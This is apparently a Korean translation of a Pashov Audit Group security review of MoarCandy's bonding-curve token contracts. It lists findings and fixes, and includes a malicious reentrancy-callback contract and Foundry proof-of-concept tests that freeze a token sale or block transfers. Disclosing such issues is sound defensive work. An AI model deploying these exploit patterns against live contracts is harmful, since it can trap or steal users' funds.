# 정보 (About)

Pashov Audit Group은 업계 최고의 스마트 계약 보안 연구원들로 구성된 여러 팀으로 이루어져 있습니다. 총 1000개 이상의 보안 취약점을 보고한 이 그룹은 절대적으로 최고의 감사 여정을 만들기 위해 노력합니다. 100% 보안을 보장할 수는 없지만, 경험 많은 연구원들이 귀하의 블록체인 프로토콜을 위해 최선을 다할 것을 보장합니다. [여기](https://github.com/pashov/audits)에서 이전 작업을 확인하거나 Twitter [@pashovkrum](https://twitter.com/pashovkrum)으로 연락해 주세요.

# 면책 조항 (Disclaimer)

스마트 계약 보안 검토는 취약점의 완벽한 부재를 보장할 수 없습니다. 이는 시간, 리소스 및 전문 지식이 제한된 노력으로, 가능한 한 많은 취약점을 찾으려고 노력합니다. 검토 후 100% 보안을 보장하거나 검토가 스마트 계약의 모든 문제를 발견할 것이라고 보장할 수 없습니다. 후속 보안 검토, 버그 바운티 프로그램 및 온체인 모니터링을 강력히 권장합니다.

# 소개 (Introduction)

**Pashov Audit Group**에 의해 **MoarCandy/contracts** 저장소에 대한 시간 제한 보안 검토가 수행되었으며, 애플리케이션의 스마트 계약 구현의 보안 측면에 중점을 두었습니다.

# MoarCandy 정보 (About MoarCandy)

MoarCandy는 사용자 정의 가능한 본딩 커브(bonding curves)와 수수료를 사용하여 새로운 ERC20 토큰을 생성할 수 있게 합니다. `ContinuosBondingERC20Token` 계약은 ETH를 사용하여 토큰의 매수 및 매도를 처리하고, 수수료를 구현하며, Uniswap이나 TraderJoe와 같은 탈중앙화 거래소에 유동성 쌍을 생성할 수 있는 본딩 커브가 있는 ERC20 토큰입니다.

# 위험 분류 (Risk Classification)

| 심각도 | 영향: 높음 | 영향: 중간 | 영향: 낮음 |
| ---------------------- | ------------ | -------------- | ----------- |
| **가능성: 높음** | 치명적 (Critical) | 높음 (High) | 중간 (Medium) |
| **가능성: 중간** | 높음 (High) | 중간 (Medium) | 낮음 (Low) |
| **가능성: 낮음** | 중간 (Medium) | 낮음 (Low) | 낮음 (Low) |

## 영향 (Impact)

- 높음 (High) - 프로토콜 자산의 상당한 물질적 손실을 초래하거나 사용자 그룹에 심각한 피해를 줍니다.

- 중간 (Medium) - 프로토콜 자산의 적당한 물질적 손실을 초래하거나 사용자 그룹에 중간 정도의 피해를 줍니다.

- 낮음 (Low) - 프로토콜 자산의 경미한 물질적 손실을 초래하거나 소규모 사용자 그룹에 피해를 줍니다.

## 가능성 (Likelihood)

- 높음 (High) - 온체인 조건을 모방한 합리적인 가정하에 공격 경로가 가능하며, 공격 비용이 훔치거나 잃을 수 있는 자금의 양에 비해 상대적으로 낮습니다.

- 중간 (Medium) - 조건부로 동기가 부여된 공격 벡터이지만 여전히 상대적으로 가능성이 높습니다.

- 낮음 (Low) - 가정이 너무 많거나 희박하거나 인센티브가 거의 없거나 전혀 없는 공격자의 상당한 지분을 필요로 합니다.

## 심각도 수준에 따른 조치 (Action required for severity levels)

- 치명적 (Critical) - 가능한 한 빨리 수정해야 함 (이미 배포된 경우)

- 높음 (High) - 수정해야 함 (아직 배포되지 않은 경우 배포 전)

- 중간 (Medium) - 수정하는 것이 좋음

- 낮음 (Low) - 수정할 수 있음

# 보안 평가 요약 (Security Assessment Summary)

**_검토 커밋 해시_ - [b8428cf068b78954c44ac5d1fe9c04b411efa541](https://github.com/MoarCandy/contracts/tree/b8428cf068b78954c44ac5d1fe9c04b411efa541)**

**_수정 검토 커밋 해시_ - [c72d907e6ff828cd807913a5a4751392a0765f8c](https://github.com/MoarCandy/contracts/tree/c72d907e6ff828cd807913a5a4751392a0765f8c)**

### 범위 (Scope)

다음 스마트 계약들이 감사 범위에 포함되었습니다:

- `BondingERC20TokenFactory`
- `ContinuosBondingERC20Token`
- `AMMFormula`

# 발견 사항 (Findings)

# [C-01] 토큰이 초기 판매 단계에 있는 동안 쌍 생성 (Creating a pair while the token is in the initial sale phase)

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

초기 판매가 종료될 무렵, 사용자가 판매 가능한 토큰보다 더 많은 토큰을 구매하는 시나리오가 발생할 수 있습니다. 이 상황에서 사용자는 최대 가용 토큰 금액을 받게 되며 초과된 ETH는 환불됩니다:

```solidity
    function buyTokens(uint256 minExpectedAmount) external payable nonReentrant returns (uint256) {
        if (liquidityGoalReached()) revert LiquidityGoalReached();
        if (msg.value == 0) revert NeedToSendETH();

        uint256 ethAmount = msg.value;
        uint256 feeAmount = (ethAmount * buyFee) / PERCENTAGE_DENOMINATOR;
        uint256 remainingAmount = ethAmount - feeAmount;

        uint256 tokenReserveBalance = getReserve();
>>      uint256 maxTokenToReceive = tokenReserveBalance - (MAX_TOTAL_SUPPLY - availableTokenBalance);

        uint256 tokensToReceive =
            bondingCurve.calculatePurchaseReturn(remainingAmount, ethBalance, tokenReserveBalance, bytes(""));
        if (tokensToReceive < minExpectedAmount) revert InSufficientAmountReceived();
        uint256 ethReceivedAmount = remainingAmount;
        uint256 refund;
>>      if (tokensToReceive > maxTokenToReceive) {
            tokensToReceive = maxTokenToReceive;
            ethReceivedAmount = getOutputPrice(tokensToReceive, ethBalance, tokenReserveBalance);
            feeAmount = (ethReceivedAmount * buyFee) / PERCENTAGE_DENOMINATOR;
            if (msg.value < (feeAmount + ethReceivedAmount)) {
                revert InsufficientETH();
            }
            refund = msg.value - (feeAmount + ethReceivedAmount);
        }
        ethBalance += ethReceivedAmount;
        treasuryClaimableEth += feeAmount;

        _transfer(address(this), msg.sender, tokensToReceive);

>>      (bool sent,) = msg.sender.call{ value: refund }("");
        if (!sent) {
            revert FailedToSendETH();
        }
        ---SNIP---
```

이 ETH 전송은 악용될 수 있습니다. 악의적인 계약은 수신 콜백(receive callback) 내에서 Token/WETH 쌍을 생성할 수 있습니다. `liquidityGoalReached()` 조건이 충족되므로 라우터로의 전송은 되돌려지지 않습니다. 쌍을 생성한 후, 공격자는 일정 양의 본딩 토큰을 ERC20 계약으로 보내어 `liquidityGoalReached()`를 비활성화함으로써 쌍이 두 번째로 생성되는 것을 방지하고 공격이 되돌려지지 않도록 할 수 있습니다. 그러면 잘못된 비율로 쌍이 생성될 수 있습니다.

결과적으로 판매가 최종적으로 상한선에 도달하면 `_createPair` 트랜잭션이 실패하여, 본딩 토큰이 판매 단계에 머물게 되고 수집된 ETH와 발행된 토큰이 갇히게 됩니다.

`ContinuosBondingERC20TokenTest.t.sol`에 대한 코드로 된 POC:

악성 계약:

```solidity
contract Refundee {
    address internal router = 0x60aE616a2155Ee3d9A68541Ba4544862310933d4; // trader joe router
    receive() external payable {
        console2.log("HUH");
        ContinuosBondingERC20Token(msg.sender).approve(router, 1 ether);
        address wNative = IJoeRouter02(router).WAVAX();
        console2.log("SUCC: ", address(this).balance);
        IJoeRouter02(router).addLiquidityAVAX{ value: 1 ether }(
            msg.sender, 1 ether, 1, 1, address(this), block.timestamp
        );
        ContinuosBondingERC20Token(msg.sender).transfer(msg.sender, 200_000_001 ether);
    }
}
```

익스플로잇:

```solidity
    function testPooled() public {
        address attacker = address(new Refundee());
        vm.deal(attacker, 10_000 ether);
        vm.deal(user, 10_000 ether);
        vm.startPrank(attacker);

        bondingERC20Token.buyTokens{ value: 202.2 ether }(0);
        // This call will revert and the token will be stuck in the initial sale phase
        vm.startPrank(user);
        vm.expectRevert();
        bondingERC20Token.buyTokens{ value: 200 ether }(0);
    }
```

## 권장 사항

```diff
-        (bool sent,) = msg.sender.call{ value: refund }("");
-        if (!sent) {
-            revert FailedToSendETH();
-        }

        if (liquidityGoalReached()) {
            _createPair();
        }

+        (bool sent,) = msg.sender.call{ value: refund }("");
+        if (!sent) {
+            revert FailedToSendETH();
+        }
```

# [C-02] 오염된 라우터로 토큰 생성 (Creating a token with a poisoned router)

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

`BondingERC20TokenFactory.deployBondingERC20Token` 함수는 사용자의 입력을 유효성 검사하지 않습니다. 따라서 가짜 라우터로 본딩 토큰을 생성하여 토큰 판매의 모든 ETH를 훔치는 것이 가능합니다.

```solidity
    function deployBondingERC20Token(
>>      address _router,
        string memory _name,
        string memory _symbol,
        LP_POOL _poolType
    )
        public
        returns (address)
    {
        ContinuosBondingERC20Token _bondingERC20Token = new ContinuosBondingERC20Token(
>>          _router,
            _name,
            _symbol,
            treasury,
            buyFee,
            sellFee,
            bondingCurve,
            initialTokenBalance,
            availableTokenBalance,
            _poolType
        );
        emit TokenDeployed(address(_bondingERC20Token), msg.sender);

        return address(_bondingERC20Token);
    }
```

ContinuosBondingERC20Token.sol

```solidity
    constructor(
>>      address _router,
        string memory _name,
        string memory _symbol,
        address _treasury,
        uint256 _buyFee,
        uint256 _sellFee,
        IBondingCurve _bondingCurve,
        uint256 _initialTokenBalance,
        uint256 _availableTokenBalance,
        LP_POOL _poolType
    )
        ERC20(_name, _symbol)
    {
>>      router = _router;
```

## 권장 사항

DEX 공식 문서의 값으로 라우터 주소를 확인할 것을 고려하십시오:
https://support.traderjoexyz.com/en/articles/6807983-contracts-api
https://docs.uniswap.org/contracts/v2/reference/smart-contracts/v2-deployments

# [C-03] 1 wei 기부로 초기 유동성 시드 차단 (Blocking the initial liquidity seed with a 1 wei donation)

## 심각도

**영향:** 높음 (High)

**가능성:** 높음 (High)

## 설명

다음 시나리오를 고려해 보십시오:

1. 본딩 토큰(TOK)이 아직 초기 판매 단계에 있는 동안, 공격자가 Uniswap에 빈 TOK/WETH 쌍을 생성합니다.
2. 그런 다음 그는 1 wei의 WETH를 쌍에 기부하고 `sync` 함수를 호출합니다:

```solidity
/// https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L198
    function sync() external lock {
        _update(IERC20(token0).balanceOf(address(this)), IERC20(token1).balanceOf(address(this)), reserve0, reserve1);
    }
```

3. 결과적으로 준비금 중 하나는 0이 아니게 됩니다. 판매가 끝나면 프로토콜은 Uniswap 라우터를 통해 쌍을 생성하려고 시도하지만 호출이 실패합니다:

```solidity
    function _addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin
    ) internal virtual returns (uint amountA, uint amountB) {
        // create the pair if it doesn't exist yet
        if (IUniswapV2Factory(factory).getPair(tokenA, tokenB) == address(0)) {
            IUniswapV2Factory(factory).createPair(tokenA, tokenB);
        }
>>      (uint reserveA, uint reserveB) = UniswapV2Library.getReserves(factory, tokenA, tokenB);
        if (reserveA == 0 && reserveB == 0) {
            (amountA, amountB) = (amountADesired, amountBDesired);
        } else {
>>          uint amountBOptimal = UniswapV2Library.quote(amountADesired, reserveA, reserveB);
            if (amountBOptimal <= amountBDesired) {
                require(amountBOptimal >= amountBMin, 'UniswapV2Router: INSUFFICIENT_B_AMOUNT');
                (amountA, amountB) = (amountADesired, amountBOptimal);
            } else {
>>              uint amountAOptimal = UniswapV2Library.quote(amountBDesired, reserveB, reserveA);
                assert(amountAOptimal <= amountADesired);
                require(amountAOptimal >= amountAMin, 'UniswapV2Router: INSUFFICIENT_A_AMOUNT');
                (amountA, amountB) = (amountAOptimal, amountBDesired);
            }
        }
    }
```

준비금 중 하나가 0이 아닌 값을 가지므로 `quote` 함수가 호출됩니다:

```solidity
    function quote(uint amountA, uint reserveA, uint reserveB) internal pure returns (uint amountB) {
        require(amountA > 0, 'UniswapV2Library: INSUFFICIENT_AMOUNT');
>>      require(reserveA > 0 && reserveB > 0, 'UniswapV2Library: INSUFFICIENT_LIQUIDITY');
        amountB = amountA.mul(reserveB) / reserveA;
    }
```

그리고 준비금 중 하나가 비어 있으므로 `addLiquidity`가 실패하여 본딩 토큰과 수집된 ETH가 계약에 갇히게 됩니다.

## 권장 사항

이 문제를 해결하려면 라우터에 의존하는 대신 Uniswap 쌍과 직접 상호 작용하는 것이 좋습니다:

```diff
        if (poolType == LP_POOL.Uniswap) {
            wNative = IUniswapV2Router02(router).WETH();
+           IFactory factory = IFactory(IUniswapV2Router02(router).factory());
+           address pair = factory.getPair(address(this), wNative);
+           if(pair == address(0)) pair = factory.createPair(address(this), wNative));
+           IWETH(wNative).deposit{value: currentEth}();
+           IWETH(wNative).transfer(pair, currentEth);
+           _transfer(address(this), pair, currentTokenBalance);
+           uint256 liquidity = IPair(pair).mint(address(this));
        } else if (poolType == LP_POOL.TraderJoe) {
            wNative = IJoeRouter02(router).WAVAX();
+           IFactory factory = IFactory(IJoeRouter02(router).factory());
+           address pair = factory.getPair(address(this), wNative);
+           if(pair == address(0)) pair = factory.createPair(address(this), wNative));
+           IWETH(wNative).deposit{value: currentEth}();
+           IWETH(wNative).transfer(pair, currentEth);
+           _transfer(address(this), pair, currentTokenBalance);
+           uint256 liquidity = IPair(pair).mint(address(this));
```

# [H-01] 본딩 커브 구현을 완전히 변경할 수 없음 (The bonding curve implementation can not be fully changed)

## 심각도

**영향:** 높음 (High)

**가능성:** 중간 (Medium)

## 설명

`BondingERC20TokenFactory.updateBondingCurve` 함수는 본딩 커브 구현을 업데이트해야 하지만, `ContinuosBondingERC20Token` 계약에 하드코딩된 `getOutputPrice` 함수는 변경하지 않습니다. 이 함수 또한 토큰 가격을 계산합니다.

```solidity
    function getOutputPrice(
        uint256 outputAmount,
        uint256 inputReserve,
        uint256 outputReserve
    )
        public
        pure
        returns (uint256)
    {
        require(inputReserve > 0 && outputReserve > 0, "Reserves must be greater than 0");
        uint256 numerator = inputReserve * outputAmount;
        uint256 denominator = (outputReserve - outputAmount);
        return numerator / denominator + 1;
    }
```

이로 인해 가격이 일반적으로 가장 높은 커브의 끝에서 잘못된 토큰 가격 계산이 발생할 수 있습니다.

## 권장 사항

`ContinuosBondingERC20Token` 계약 대신 `AMMFormula` 계약에 `getOutputPrice` 함수를 구현하는 것을 고려하십시오.

# [H-02] 쌍 생성 후 본딩 토큰 전송 DOS (Bonding token transfers DOS after the pair was created)

## 심각도

**영향:** 높음 (High)

**가능성:** 중간 (Medium)

## 설명

사용자는 초기 판매가 완료되고 Token/WETH 쌍이 생성되기 전에는 본딩 토큰을 전송할 수 없습니다:

```solidity
    function _update(address from, address to, uint256 value) internal virtual override {
        // will revert for normal transfer till goal not reached
        if (
            !liquidityGoalReached() && from != address(0) && to != address(0) && from != address(this)
                && to != address(this)
        ) {
            revert TransferNotAllowedUntilLiquidityGoalReached();
        }
        super._update(from, to, value);
    }
```

불행히도, 이 보호 조치는 초기 유동성이 있는 쌍이 생성된 후 토큰 전송에 대해 DoS를 수행하는 데 악용될 수 있습니다. 공격자는 `MAX_TOTAL_SUPPLY - availableTokenBalance + 1` 토큰을 기부하여 `liquidityGoalReached()`를 재설정할 수 있습니다:

```solidity
    function liquidityGoalReached() public view returns (bool) {
        return getReserve() <= (MAX_TOTAL_SUPPLY - availableTokenBalance);
    }
```

`ContinuosBondingERC20TokenTest.t.sol`에 대한 코드로 된 POC:

```solidity
    function testTokenDown() public {
        vm.deal(user, 10_000 ether);
        vm.startPrank(user);

        bondingERC20Token.buyTokens{ value: 202.2 ether }(0);

        vm.expectRevert();
        bondingERC20Token.buyTokens{ value: 1 wei }(0);

        // pair is created
        assertEq(bondingERC20Token.isLpCreated(), true);
        assertEq(bondingERC20Token.getReserve(), 0);

        // donate tokens to the ERC20 contract
        bondingERC20Token.transfer(address(bondingERC20Token), 200_000_001 ether);

        // revert TransferNotAllowedUntilLiquidityGoalReached()
        vm.expectRevert();
        bondingERC20Token.transfer(address(this), 10 ether);
    }
```

## 권장 사항

```diff
    function _update(address from, address to, uint256 value) internal virtual override {
        // will revert for normal transfer till goal not reached
       if (
            !liquidityGoalReached() && from != address(0) && to != address(0) && from != address(this)
+               && to != address(this) && !isPairCreated
        ) {
```

# [M-01] `isLpCreated` 검증 부재 (Lack of `isLpCreated` validation)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`ContinuosBondingERC20Token` 계약 함수에서 `isLpCreated` 변수 검증이 부족하여 본딩 토큰을 구매 단계로 되돌리는 것이 가능합니다. 이는 `_createPair`를 이차적으로 포함하거나 재무부 수수료를 인출하는 것과 같은 예상치 못한 동작을 유발할 수 있지만, 거의 항상 경제적으로 비효율적입니다.
`isLpCreated` 변수는 `_createPair` 함수에서 `true`로 설정되지만 확인되지 않습니다.

```solidity
    function _createPair() internal {
        uint256 currentTokenBalance = getReserve();
        uint256 currentEth = ethBalance - initialTokenBalance;
>>      isLpCreated = true;
```

## 권장 사항

`buyTokens` 및 `sellTokens`에서 `isLpCreated` 변수를 확인하는 것을 고려하십시오.

```solidity
        if (liquidityGoalReached() || isLpCreated) revert LiquidityGoalReached();
```

# [M-02] 잘못된 수수료 계산 (Incorrect fee calculation)

## 심각도

**영향:** 중간 (Medium)

**가능성:** 중간 (Medium)

## 설명

`ContinuosBondingERC20Token.buyTokens`는 `tokensToReceive > maxTokenToReceive`인 경우 일반적인 흐름보다 적은 수수료를 청구합니다.

```solidity
    function buyTokens(uint256 minExpectedAmount) external payable nonReentrant returns (uint256) {
        if (liquidityGoalReached()) revert LiquidityGoalReached();
        if (msg.value == 0) revert NeedToSendETH();

>>      uint256 ethAmount = msg.value;
>>      uint256 feeAmount = (ethAmount * buyFee) / PERCENTAGE_DENOMINATOR;
        uint256 remainingAmount = ethAmount - feeAmount;

        uint256 tokenReserveBalance = getReserve();
        uint256 maxTokenToReceive = tokenReserveBalance - (MAX_TOTAL_SUPPLY - availableTokenBalance);

        uint256 tokensToReceive =
            bondingCurve.calculatePurchaseReturn(remainingAmount, ethBalance, tokenReserveBalance, bytes(""));
        if (tokensToReceive < minExpectedAmount) revert InSufficientAmountReceived();
        uint256 ethReceivedAmount = remainingAmount;
        uint256 refund;
        if (tokensToReceive > maxTokenToReceive) {
            tokensToReceive = maxTokenToReceive;
            ethReceivedAmount = getOutputPrice(tokensToReceive, ethBalance, tokenReserveBalance);
>>          feeAmount = (ethReceivedAmount * buyFee) / PERCENTAGE_DENOMINATOR;
            if (msg.value < (feeAmount + ethReceivedAmount)) {
                revert InsufficientETH();
            }
>>          refund = msg.value - (feeAmount + ethReceivedAmount);
        }
```

## 권장 사항

`tokensToReceive > maxTokenToReceive`일 때 수수료 계산을 위해 다른 방법을 사용하는 것을 고려하십시오:

```solidity
feeAmount = ethReceivedAmount * PERCENTAGE_DENOMINATOR / (PERCENTAGE_DENOMINATOR -  buyFee) - ethReceivedAmount;
```
```

# [L-01] 반올림 문제에 대한 쌍 생성 무결성 검사 부재 (No sanity check on creating pair for rounding issues)

유동성 목표가 달성되면 토큰은 UniV2 쌍을 생성하고 Token + ETH를 공급합니다. 보시다시피, 계약은 `currentEth`를 전달합니다. 즉, 충분한 잔액이 있다고 예상합니다:

```solidity
    function _createPair() internal {
        ...
@>      uint256 currentEth = ethBalance - initialTokenBalance;
        ...
        if (poolType == LP_POOL.Uniswap) {
            wNative = IUniswapV2Router02(router).WETH();
@>          (,, liquidity) = IUniswapV2Router02(router).addLiquidityETH{ value: currentEth }(
                address(this), currentTokenBalance, currentTokenBalance, currentEth, address(this), block.timestamp
            );
        } else if (poolType == LP_POOL.TraderJoe) {
            wNative = IJoeRouter02(router).WAVAX();
@>          (,, liquidity) = IJoeRouter02(router).addLiquidityAVAX{ value: currentEth }(
                address(this), currentTokenBalance, currentTokenBalance, currentEth, address(this), block.timestamp
            );
        }
        ...
    }
```

불충분한 잔액으로 인해 되돌려지지 않도록 무결성 검사를 추가하는 것을 고려하십시오. 이는 다른 잠재적 문제로 인해 발생할 수 있습니다.

```diff
        uint256 currentEth = ethBalance - initialTokenBalance;
+       currentEth = currentEth > address(this).balance ? address(this).balance : currentEth;
```

# [L-02] 세터(setters)에 대한 무결성 검사 부재 (No sanity checks on setters)

현재 새로운 값에 대한 안전한 범위가 없습니다. 조기에 관리자 실수를 포착하기 위해 범위를 추가하는 것을 고려하십시오:

```solidity
    function updateBuyFee(uint256 _newBuyFee) public onlyOwner {
        emit BuyFeeUpdated(_newBuyFee, buyFee);
        buyFee = _newBuyFee;
    }

    function updateSellFee(uint256 _newSellFee) public onlyOwner {
        emit SellFeeUpdated(_newSellFee, sellFee);
        sellFee = _newSellFee;
    }

    function updateTreasury(address _newTreasury) public onlyOwner {
        emit TreasuryUpdated(_newTreasury, treasury);
        treasury = _newTreasury;
    }

    function updateAvailableTokenBalance(uint256 _newAvailableTokenBalance) public onlyOwner {
        emit AvailableTokenUpdated(_newAvailableTokenBalance, availableTokenBalance);
        availableTokenBalance = _newAvailableTokenBalance;
    }

    function updateInitialTokenBalance(uint256 _newInitialTokenBalance) public onlyOwner {
        emit InitialTokenBalanceUpdated(_newInitialTokenBalance, initialTokenBalance);
        initialTokenBalance = _newInitialTokenBalance;
    }

    function updateBondingCurve(IBondingCurve _newBondingCurve) public onlyOwner {
        emit BondingCurveUpdated(address(_newBondingCurve), address(bondingCurve));
        bondingCurve = _newBondingCurve;
    }
```

여기에 발견 사항과 권장 사항을 설명하십시오.

# [L-03] `sellTokens`에서 잘못된 확인 (Incorrect check in the `sellTokens`)

`ContinuosBondingERC20Token.sellTokens`의 ETH 잔액 충분성 확인은 `treasuryClaimableEth` 변수를 계산하지 않지만 계산해야 합니다.

```solidity
    function sellTokens(uint256 tokenAmount, uint256 minExpectedEth) external nonReentrant returns (uint256) {
        if (liquidityGoalReached()) revert LiquidityGoalReached();
        if (tokenAmount == 0) revert NeedToSellTokens();

        uint256 tokenReserveBalance = getReserve();
        uint256 reimburseAmount =
            bondingCurve.calculateSaleReturn(tokenAmount, tokenReserveBalance, ethBalance, bytes(""));

        uint256 feeAmount = (reimburseAmount * sellFee) / PERCENTAGE_DENOMINATOR;
        ethBalance -= reimburseAmount;
        reimburseAmount -= feeAmount;
>>      treasuryClaimableEth += feeAmount;

        if (reimburseAmount < minExpectedEth) revert InSufficientAmountReceived();
>>      if (address(this).balance < reimburseAmount) revert ContractNotEnoughETH();

        _transfer(msg.sender, address(this), tokenAmount);
        (bool sent,) = msg.sender.call{ value: reimburseAmount }("");
        if (!sent) revert FailedToSendETH();

        if (treasuryClaimableEth >= 0.1 ether) {
            (bool sent,) = TREASURY_ADDRESS.call{ value: treasuryClaimableEth }("");
            treasuryClaimableEth = 0;
            if (!sent) {
                revert FailedToSendETH();
            }
        }

        emit TokensSold(msg.sender, tokenAmount, reimburseAmount, feeAmount);
    }
```

# [L-04] `buyTokens`에서 잘못된 슬리피지 확인 위치 (Incorrect slippage check placement in `buyTokens`)

본딩 토큰 판매에는 사용자가 구매 거래에서 받을 것으로 예상하는 최소 토큰 양을 지정할 수 있는 슬리피지 확인이 포함되어 있습니다. 이 조건이 충족되지 않으면 트랜잭션이 되돌려집니다:

```solidity
    function buyTokens(uint256 minExpectedAmount) external payable nonReentrant returns (uint256) {
        if (liquidityGoalReached()) revert LiquidityGoalReached();
        if (msg.value == 0) revert NeedToSendETH();

        uint256 ethAmount = msg.value;
        uint256 feeAmount = (ethAmount * buyFee) / PERCENTAGE_DENOMINATOR;
        uint256 remainingAmount = ethAmount - feeAmount;

        uint256 tokenReserveBalance = getReserve();
        uint256 maxTokenToReceive = tokenReserveBalance - (MAX_TOTAL_SUPPLY - availableTokenBalance);

        uint256 tokensToReceive =
            bondingCurve.calculatePurchaseReturn(remainingAmount, ethBalance, tokenReserveBalance, bytes(""));
>>      if (tokensToReceive < minExpectedAmount) revert InSufficientAmountReceived();
```

그러나 이 확인은 특정 상황에서 효과적이지 않습니다. 구매한 금액이 판매 가능한 금액을 초과하면 수신된 금액이 제한됩니다. 결과적으로 사용자는 `minExpectedAmount`에 지정된 것보다 적은 토큰을 받을 수 있으며, 슬리피지 확인에도 불구하고 트랜잭션이 진행될 수 있습니다.

다음 수정을 고려하십시오:

```diff
    function buyTokens(uint256 minExpectedAmount) external payable nonReentrant returns (uint256) {
        ---SNIP---
        if (tokensToReceive > maxTokenToReceive) {
            tokensToReceive = maxTokenToReceive;
            ethReceivedAmount = getOutputPrice(tokensToReceive, ethBalance, tokenReserveBalance);
            feeAmount = (ethReceivedAmount * buyFee) / PERCENTAGE_DENOMINATOR;
            if (msg.value < (feeAmount + ethReceivedAmount)) {
                revert InsufficientETH();
            }
            refund = msg.value - (feeAmount + ethReceivedAmount);
        }
        ethBalance += ethReceivedAmount;
        treasuryClaimableEth += feeAmount;
+       if (tokensToReceive < minExpectedAmount) revert InSufficientAmountReceived();
        _transfer(address(this), msg.sender, tokensToReceive);
```

# [L-05] `_availableTokenBalance` 매개변수 확인 부재 (Lack of checking `_availableTokenBalance` parameter)

`availableTokenBalance` 변수는 DEX에서의 토큰 시작 가격에 있어 중요한 의미를 가지며, 이는 차익 거래를 방지하기 위해 본딩 커브 끝에서의 토큰 가격과 일치해야 합니다.

```solidity
    constructor(
        address _owner,
        IBondingCurve _bondingCurve,
        address _treasury,
        uint256 _initialTokenBalance,
        uint256 _availableTokenBalance,
        uint256 _buyFee,
        uint256 _sellFee
    )
        Ownable(_owner)
    {
        bondingCurve = _bondingCurve;
        treasury = _treasury;
        initialTokenBalance = _initialTokenBalance;
>>      availableTokenBalance = _availableTokenBalance;
        buyFee = _buyFee;
        sellFee = _sellFee;
    }
<...>
    function updateAvailableTokenBalance(uint256 _newAvailableTokenBalance) public onlyOwner {
        emit AvailableTokenUpdated(_newAvailableTokenBalance, availableTokenBalance);
>>      availableTokenBalance = _newAvailableTokenBalance;
    }
```

조작을 방지하기 위해 동일한 함수에서 해당 확인을 구현하고 `availableTokenBalance` 변수와 본딩 커브를 변경하는 것을 고려하십시오.

```

